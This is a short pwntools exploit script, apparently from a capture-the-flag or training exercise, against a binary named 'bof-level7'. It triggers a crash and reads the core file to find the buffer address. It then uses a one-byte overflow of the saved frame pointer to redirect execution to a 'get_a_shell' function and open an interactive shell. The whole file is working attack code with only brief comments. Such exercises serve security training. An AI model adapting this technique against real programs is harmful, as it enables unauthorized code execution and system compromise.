from pwn import *

# Set up attack
p = process("./bof-level7")
e = ELF("./bof-level7")

# Need to change ending address to start of buffer
# Find by inspecting core file and finding the 78's
# Create a segfault with a random guess to make core file
prog_input = p32(0x78787878) + (p32(e.symbols['get_a_shell'])) + 128 * 'a' + "\x60"
p.sendline(prog_input)
p.wait()

# Parse core file to get the last byte of the buffer address
c = Core('./core')
buff = c.stack.find(prog_input)
end = buff & 0x000000ff

# Change EBP to buffer address and EBP + 4 to return address (get a shell)
p = process("./bof-level7")
prog_input = p32(0x78787878) + (p32(e.symbols['get_a_shell'])) + 128 * 'a' + chr(end)
p.sendline(prog_input)
p.interactive()
